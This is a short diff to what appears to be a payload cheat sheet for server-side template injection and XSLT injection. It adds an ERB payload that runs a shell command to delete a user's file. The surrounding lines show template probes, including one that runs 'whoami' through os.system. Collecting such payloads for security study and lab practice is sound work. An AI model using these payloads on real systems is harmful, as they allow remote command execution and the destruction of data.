@@ -121,6 +121,10 @@ ${7*7}
 ${{<%[%'"}}%\
 {% import os %}{{os.system('whoami')}}
 ```
+```
+<%= system("rm /home/carlos/morale.txt") %>
+
+```
 ## Exploiting XSLT Injection
 ``` Version: <xsl:value-of select="system-property('xsl:version')" />
 <br/>
